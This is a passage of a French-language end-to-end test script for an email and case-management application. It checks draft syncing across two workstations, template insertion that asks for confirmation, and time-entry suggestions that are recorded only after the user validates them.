    await attendre("le brouillon est dans la liste", () => present(ligneBrouillon), Boolean, 20_000);
    verifier("ligne : destinataire et objet", norm(await texteDe(ligneBrouillon)).includes(`À reprise.${marque}@example.com`) && (await texteDe(ligneBrouillon)).includes(objetReprise));
    essaiNegatif("un message reçu figure dans les Brouillons", await present(ligne));
    verifier("compteur du dossier Brouillons", Number(await texteDe("[data-testid=dossier-imap][data-dossier=brouillons] [data-testid=compteur-dossier]")) >= 1);
    await cliquer(ligneBrouillon);
    await attendre("brouillon rouvert", () => present(FORM), Boolean);
    verifier("reprise : même identifiant, objet, destinataire, texte",
      (await idBrouillon()) === idR &&
        (await js(`document.querySelector("[data-testid=redac-objet]").value`)) === objetReprise &&
        (await adressesChamp("a")).includes(`reprise.${marque}@example.com`) &&
        (await htmlCorps()).includes(`Texte à reprendre ${marque}`),
    );
    verifier("reprise : statut « visible sur vos autres appareils »", /visible sur vos autres appareils/u.test(norm(await texteDe("[data-testid=redac-statut]"))));
    await sleep(2500);
    const corpsRepris = await htmlCorps();
    verifier("reprise : la signature n'est pas insérée une seconde fois dans un brouillon repris", occurrences(corpsRepris, sigCabinet) === 1 && occurrences(corpsRepris, "<p>--</p>") === 1, corpsRepris);
    essaiNegatif("un brouillon repris reçoit une seconde signature", occurrences(corpsRepris, sigCabinet) > 1);
    // Second poste : le brouillon y est, et s'y reprend.
    resetPostes(["j11rb"]);
    posteB = await ouvrirPoste("j11rb", 9352, { email: demoEmail, password: demoPassword, secret: totpSecretB32, nomAppareil: `J11 redaction B ${marque}`, mode: "copie" });
    const sendA = send;
    send = posteB.page.send;
    const ligneB = await attendre("brouillon synchronisé sur le second poste", () => sqliteLocal(`SELECT objet, corps_html FROM brouillons_message WHERE id = '${idR}'`), (r) => Array.isArray(r) && r.length === 1, 120_000);
    verifier("second poste : contenu du brouillon", ligneB[0].objet === objetReprise && String(ligneB[0].corps_html).includes(`Texte à reprendre ${marque}`));
    essaiNegatif("le second poste a le brouillon envoyé", Number((await sqliteLocal(`SELECT COUNT(*) AS n FROM brouillons_message WHERE id = '${id}'`))?.[0]?.n) > 0);
    await cliquer("[data-testid=nav-mails]");
    await attendre("écran Mails (poste B)", () => present("[data-testid=mails-trois-volets]"), Boolean);
    await attendre("dossier Brouillons (poste B)", () => present("[data-testid=dossier-imap][data-dossier=brouillons]"), Boolean, 30_000);
    await cliquer("[data-testid=dossier-imap][data-boite=perso][data-dossier=brouillons]");
    await attendre("brouillon dans la liste (poste B)", () => present(ligneBrouillon), Boolean, 30_000);
    await cliquer(ligneBrouillon);
    await attendre("brouillon rouvert (poste B)", () => present(FORM), Boolean);
    verifier("repris sur un autre poste", (await js(`document.querySelector("[data-testid=redac-objet]").value`)) === objetReprise && (await htmlCorps()).includes(`Texte à reprendre ${marque}`));
    await sleep(2000);
    verifier("poste B : la signature du brouillon est là, une seule fois", occurrences(await htmlCorps(), sigCabinet) === 1);
    await focusCorps();
    await js(`(() => { const el = document.querySelector("[data-testid=redac-corps]"); const r = document.createRange(); r.selectNodeContents(el); r.collapse(false); const s = getSelection(); s.removeAllRanges(); s.addRange(r); })()`);
    await taper(` suite du poste B ${marque}`);
    await attendre("suite écrite sur B reçue par le serveur", () => sqlServeur(`SELECT corps_html FROM brouillons_message WHERE id = '${idR}'`), (v) => v.includes(`suite du poste B ${marque}`), 40_000);
    send = sendA;
    await attendre("suite visible sur le poste A (dernière écriture gagnante)", () => sqliteLocal(`SELECT corps_html FROM brouillons_message WHERE id = '${idR}'`), (r) => String(r?.[0]?.corps_html).includes(`suite du poste B ${marque}`), 60_000);
    ok("reprise : brouillon rouvert depuis les Brouillons, repris sur un second poste, écriture du second poste rendue au premier");
    await posteB.page.ws.close();
    await stopApp(posteB.child);
    posteB = null;

    // Suppression du brouillon (poste A).
    await cliquer("[data-testid=dossier-imap][data-boite=perso][data-dossier=reception]");
    await cliquer("[data-testid=dossier-imap][data-boite=perso][data-dossier=brouillons]");
    await attendre("brouillon repris (A)", () => present(ligneBrouillon), Boolean, 20_000);
    await cliquer(ligneBrouillon);
    await attendre("brouillon rouvert (A)", () => present(FORM), Boolean);
    await cliquer("[data-testid=redac-supprimer]");
    await attendre("rédaction fermée après suppression", () => present(FORM), (v) => v === false, 10_000);
    await attendre("brouillon supprimé du serveur", () => sqlServeur(`SELECT COUNT(*) FROM brouillons_message WHERE id = '${idR}'`), (v) => v === "0", 40_000);
    await attendre("copie IMAP supprimée", async () => copiesBrouillon(messageIdR), (c) => c.length === 0, 30_000);
    await attendre("brouillon supprimé du poste", () => sqliteLocal(`SELECT COUNT(*) AS n FROM brouillons_message WHERE id = '${idR}'`), (r) => Number(r?.[0]?.n) === 0, 20_000);
    await attendre("la ligne a quitté la liste", () => present(ligneBrouillon), (v) => v === false, 10_000);
    verifier("aucun refus consigné pour les brouillons de cette recette", Number((await sqliteLocal(`SELECT COUNT(*) AS n FROM refus_sync WHERE table_cible = 'brouillons_message'`))?.[0]?.n) === 0);
    ok("suppression : poste, serveur et copie IMAP");

    // ===== 11. Modèle de message dans la rédaction : créé dans Réglages, proposé tout de suite, sans recompiler =====
    await ouvrirMails();
    await evaluate(send, `[...document.querySelectorAll("[data-testid=barre-actions] button")].find((b) => b.innerText.includes("Nouveau mail"))?.click()`);
    await attendre("nouveau mail (modèle)", () => present(FORM), Boolean, 15_000);
    await choisirDe("");
    await attendre("signature du message (modèle)", () => htmlCorps(), (h) => h.includes(sigCabinet), 15_000);
    const idM = await idBrouillon();
    await cliquer("[data-testid=outil-modele]");
    await attendre("panneau des modèles", () => present("[data-testid=panneau-modeles]"), Boolean, 10_000);
    const choixModeles = await attendre("modèle créé dans Réglages proposé", () => js(`[...document.querySelectorAll("[data-testid=modele-choix]")].map((b) => b.getAttribute("data-nom"))`), (n) => n.includes(nomModele), 15_000);
    essaiNegatif("le modèle supprimé est encore proposé", choixModeles.includes(nomRetire));
    await capturer("redaction-modeles-poste-reel-jour.png", "light");
    await capturer("redaction-modeles-poste-reel-nuit.png", "dark");
    await js(`document.documentElement.dataset.theme = "light"`);
    const choixModele = `[data-testid=modele-choix][data-nom=${JSON.stringify(nomModele)}]`;
    await cliquer(choixModele);
    await attendre("modèle inséré", () => htmlCorps(), (h) => h.includes(texteModele), 10_000);
    verifier("modèle : l'objet du modèle (modifié dans Réglages) entre dans l'objet", (await valeurDe("[data-testid=redac-objet]")) === objetModeleModifie);
    const corpsModele = await htmlCorps();
    verifier("modèle : le texte entre sous la ligne vide, avant la signature, une seule fois", ordre(corpsModele, texteModele, "<p>--</p>", sigCabinet) && occurrences(corpsModele, texteModele) === 1 && occurrences(corpsModele, sigCabinet) === 1, corpsModele);
    verifier("le panneau des modèles se referme", !(await present("[data-testid=panneau-modeles]")));
    await attendre("modèle enregistré avec le brouillon au serveur", () => sqlServeur(`SELECT objet || '|' || corps_html FROM brouillons_message WHERE id = '${idM}'`), (v) => v.startsWith(`${objetModeleModifie}|`) && v.includes(texteModele), 40_000);
    // Du texte déjà écrit n'est jamais remplacé sans confirmation.
    await js(`(() => { const el = document.querySelector("[data-testid=redac-corps]"); el.focus(); const r = document.createRange(); r.setStart(el.firstElementChild, 0); r.collapse(true); const s = getSelection(); s.removeAllRanges(); s.addRange(r); })()`);
    await taper(`ajout manuel ${marque} `);
    await saisir("[data-testid=redac-objet]", `Mon objet ${marque}`);
    await cliquer("[data-testid=outil-modele]");
    await cliquer(choixModele);
    const phraseConfirmation = await attendre("confirmation avant de remplacer", () => texteDe("[data-testid=modele-confirmation]"), (t) => t !== "", 10_000);
    verifier("la confirmation nomme le modèle, le texte et l'objet", norm(phraseConfirmation).includes(nomModele) && norm(phraseConfirmation).includes("remplacera votre texte et votre objet"), phraseConfirmation);
    verifier("rien n'est remplacé avant la réponse", (await htmlCorps()).includes(`ajout manuel ${marque}`) && (await valeurDe("[data-testid=redac-objet]")) === `Mon objet ${marque}`);
    await cliquer("[data-testid=modele-annuler]");
    await sleep(500);
    verifier("« Garder mon texte » : le texte et l'objet écrits sont conservés", (await htmlCorps()).includes(`ajout manuel ${marque}`) && (await valeurDe("[data-testid=redac-objet]")) === `Mon objet ${marque}`);
    essaiNegatif("le modèle a remplacé le texte écrit malgré « Garder mon texte »", !(await htmlCorps()).includes(`ajout manuel ${marque}`));
    await cliquer(choixModele);
    await attendre("confirmation (seconde fois)", () => present("[data-testid=modele-confirmation]"), Boolean, 10_000);
    await cliquer("[data-testid=modele-remplacer]");
    await attendre("texte remplacé après confirmation", () => htmlCorps(), (h) => !h.includes(`ajout manuel ${marque}`), 10_000);
    const corpsRemplace = await htmlCorps();
    verifier("« Remplacer » : le modèle prend la place du texte, la signature reste, une seule fois", corpsRemplace.includes(texteModele) && occurrences(corpsRemplace, sigCabinet) === 1 && (await valeurDe("[data-testid=redac-objet]")) === objetModeleModifie, corpsRemplace);
    await cliquer("[data-testid=redac-supprimer]");
    await attendre("brouillon du modèle supprimé", () => sqlServeur(`SELECT COUNT(*) FROM brouillons_message WHERE id = '${idM}'`), (v) => v === "0", 40_000);
    ok("modèle de message : proposé sans recompiler, objet et corps insérés, jamais de texte écrit remplacé sans confirmation");

    // ===== 12. Suggestion de temps tirée d'un mail =====
    const tempsLocal = (dossier) => sqliteLocal(`SELECT minutes, libelle, taux_centimes_heure, ht_centimes FROM temps_saisis WHERE dossier_id = '${dossier}'`);
    const tempsServeur = (dossier) => sqlServeur(`SELECT COUNT(*) FROM temps_saisis WHERE dossier_id = '${dossier}'`);
    const proposition = () =>
      js(`(() => {
        const e = document.querySelector("[data-testid=proposition-temps]");
        if (!e) return null;
        return {
          minutes: e.getAttribute("data-minutes"),
          texte: e.innerText,
          bouton: e.querySelector("[data-testid=proposition-temps-saisir]").innerText,
          saisie: e.querySelector("[data-testid=proposition-temps-minutes]").value,
        };
      })()`);
    const classerDansDossierA = async (idMail) => {
      await cliquer("[data-testid=vue-a-classer]");
      const ligneMail = `[data-testid=mail-ligne][data-id="${idMail}"]`;
      await attendre("mail à classer dans la liste", () => present(ligneMail), Boolean, 20_000);
      await cliquer(ligneMail);
      await attendre("encart de classement", () => present("[data-testid=bouton-autre-dossier]"), Boolean, 20_000);
      essaiNegatif("une proposition de temps pour un mail non classé", await present("[data-testid=proposition-temps]"));
      await cliquer("[data-testid=bouton-autre-dossier]");
      await attendre("liste des dossiers", () => present("[data-testid=classer-dossier]"), Boolean, 10_000);
      await attendre("dossier de la recette dans la liste", () => js(`[...document.querySelectorAll("[data-testid=classer-dossier] option")].some((o) => o.value === ${JSON.stringify(dossierA)})`), Boolean, 30_000);
      verifier("dossier choisi", await choisirOption("[data-testid=classer-dossier]", dossierA));
      await cliquer("[data-testid=bouton-classer]");
      await attendre("proposition de temps après le classement", () => present("[data-testid=proposition-temps]"), Boolean, 20_000);
    };
    await ouvrirMails();
    await classerDansDossierA(idMessageDeux);
    const p1 = await proposition();
    verifier("mail lu seulement : 6 minutes, « Saisir 6 min », pré-remplies et modifiables", p1?.minutes === "6" && norm(p1.bouton) === "Saisir 6 min" && p1.saisie === "6", JSON.stringify(p1));
    verifier("la proposition nomme le dossier et le motif, et dit que rien n'est enregistré sans accord", norm(p1.texte).includes(`Redaction Alpha ${marque}`) && norm(p1.texte).includes("Lecture d'un mail") && norm(p1.texte).includes("Rien n'est enregistré sans votre accord"), p1.texte);
    await sleep(3000);
    verifier("proposé, jamais enregistré : aucune saisie de temps sur le poste ni au serveur", (await tempsLocal(dossierA)).length === 0 && (await tempsServeur(dossierA)) === "0");
    essaiNegatif("le temps a été saisi sans validation", (await tempsServeur(dossierA)) !== "0");
    await capturer("temps-mail-poste-reel-jour.png", "light");
    await capturer("temps-mail-poste-reel-nuit.png", "dark");
    await js(`document.documentElement.dataset.theme = "light"`);
    // Minutes invalides : le bouton est inactif et rien n'est saisi.
    for (const invalide of ["0", "abc", "", "999"]) {
      await saisir("[data-testid=proposition-temps-minutes]", invalide);
      await sleep(150);
      verifier(`minutes « ${invalide} » : bouton inactif`, (await desactive("[data-testid=proposition-temps-saisir]")) === true);
    }
    await cliquer("[data-testid=proposition-temps-saisir]");
    await sleep(800);
    essaiNegatif("un clic sur un bouton inactif a saisi du temps", (await tempsServeur(dossierA)) !== "0" || (await tempsLocal(dossierA)).length !== 0);
    // Minutes corrigées puis validées.
    await saisir("[data-testid=proposition-temps-minutes]", "7");
    await sleep(150);
    verifier("le bouton suit les minutes saisies : « Saisir 7 min »", norm(await texteDe("[data-testid=proposition-temps-saisir]")) === "Saisir 7 min" && (await desactive("[data-testid=proposition-temps-saisir]")) === false);
    await cliquer("[data-testid=proposition-temps-saisir]");
    await attendre("confirmation de la saisie", () => texteDe("[data-testid=temps-saisi-confirmation]"), (t) => norm(t).includes("Temps saisi : 7 min"), 20_000);
    verifier("la proposition a disparu une fois le temps saisi", !(await present("[data-testid=proposition-temps]")));
    const ligneTemps = await attendre("saisie de temps sur le poste", () => tempsLocal(dossierA), (r) => Array.isArray(r) && r.length === 1, 20_000);
    const t0 = ligneTemps[0];
    verifier("saisie locale : minutes validées, libellé du traitement, taux figé, montant", t0.minutes === 7 && t0.libelle === "Lecture d'un mail" && t0.taux_centimes_heure > 0 && t0.ht_centimes === Math.trunc((7 * t0.taux_centimes_heure) / 60), JSON.stringify(t0));
    verifier("le libellé ne reprend ni l'objet ni le contenu du mail", !t0.libelle.includes(marque));
    const brouillonFacture = await sqliteLocal(`SELECT numero, ht_centimes FROM brouillons_facture WHERE dossier_id = '${dossierA}'`);
    verifier("brouillon de facture sans numéro, même montant (chemin d'écriture des temps)", brouillonFacture.length === 1 && brouillonFacture[0].numero === null && brouillonFacture[0].ht_centimes === t0.ht_centimes, JSON.stringify(brouillonFacture));
    const ligneServeurTemps = await attendre("saisie reçue par le serveur (connecteur du poste)", () => sqlServeur(`SELECT minutes || '|' || libelle || '|' || taux_centimes_heure || '|' || ht_centimes FROM temps_saisis WHERE dossier_id = '${dossierA}'`), (v) => v !== "", 40_000);
    verifier("ligne de temps au serveur : mêmes minutes, libellé, taux et montant", ligneServeurTemps === `7|Lecture d'un mail|${t0.taux_centimes_heure}|${t0.ht_centimes}`, ligneServeurTemps);
    ok("suggestion de temps (lecture) : proposée, jamais enregistrée sans validation, minutes corrigées, ligne de temps locale puis serveur");

    // Le temps réglé n'est plus proposé, même après être revenu sur le mail.
    await cliquer("[data-testid=dossier-imap][data-boite=partagee][data-dossier=reception]");
    const ligneDeux = `[data-testid=mail-ligne][data-id="${idMessageDeux}"]`;
    await attendre("second mail dans la réception", () => present(ligneDeux), Boolean, 20_000);
    await cliquer(ligneDeux);
    await attendre("lecture du second mail", () => texteDe("[data-testid=lecture-objet]"), (t) => t.includes(objetLecture), 10_000);
    await attendre("mail classé", () => present("[data-testid=encart-classe]"), Boolean, 20_000);
    await sleep(800);
    essaiNegatif("le temps déjà saisi est proposé de nouveau", await present("[data-testid=proposition-temps]"));
    verifier("une seule saisie de temps pour ce mail", (await tempsServeur(dossierA)) === "1");

    // Mail répondu à tous puis transféré (sections 8 et 9) : 12 + 6 minutes, proposition écartée sans rien saisir.
    await classerDansDossierA(idMessage);
    const p2 = await proposition();
    verifier("mail répondu et transféré : 18 minutes", p2?.minutes === "18" && norm(p2.bouton) === "Saisir 18 min", JSON.stringify(p2));
    verifier("le motif nomme la réponse et le transfert", norm(p2.texte).includes("Réponse à un mail et transfert d'un mail"), p2.texte);
    await cliquer("[data-testid=proposition-temps-ecarter]");
    await attendre("proposition écartée", () => present("[data-testid=proposition-temps]"), (v) => v === false, 10_000);
    await sleep(1500);
    verifier("« Pas maintenant » n'enregistre rien", (await tempsServeur(dossierA)) === "1" && (await tempsLocal(dossierA)).length === 1);
    await cliquer(ligneDeux);
    await cliquer(`[data-testid=mail-ligne][data-id="${idMessage}"]`);
    await attendre("retour sur le mail écarté", () => texteDe("[data-testid=lecture-objet]"), (t) => t.includes(objetRecu), 10_000);
    await sleep(800);
    essaiNegatif("la proposition écartée revient", await present("[data-testid=proposition-temps]"));
    ok("suggestion de temps (réponse et transfert) : 18 minutes proposées, écartée sans rien saisir, ne revient pas");

    // ===== 13. Réglages : suppression du modèle de la recette =====
    await ouvrirReglages();
    await attendre("modèle de la recette dans la liste", () => present(ligneModele(nomModele)), Boolean, 20_000);
    await cliquer(`${ligneModele(nomModele)} [data-testid=modele-supprimer]`);
    await cliquer(`${ligneModele(nomModele)} [data-testid=modele-supprimer-confirmer]`);
    await attendre("modèle de la recette supprimé", () => compteModeles(nomModele), (v) => v === "0", 20_000);
    ok("réglages : modèle supprimé, ne figure plus dans la liste");

    page.ws.close();
  } finally {
    if (posteB) await stopApp(posteB.child);
    await stopApp(child);
  }
  ok("OK");
  void creeA;
}

main()
  .catch((err) => {
    console.error(`j11-redaction: ${err instanceof Error ? err.message : String(err)}`);
    if (err instanceof Error && err.stack) console.error(err.stack.split("\n").slice(1, 6).join("\n"));
    process.exitCode = 1;
  })
  .finally(() => {
    fermer();
  });
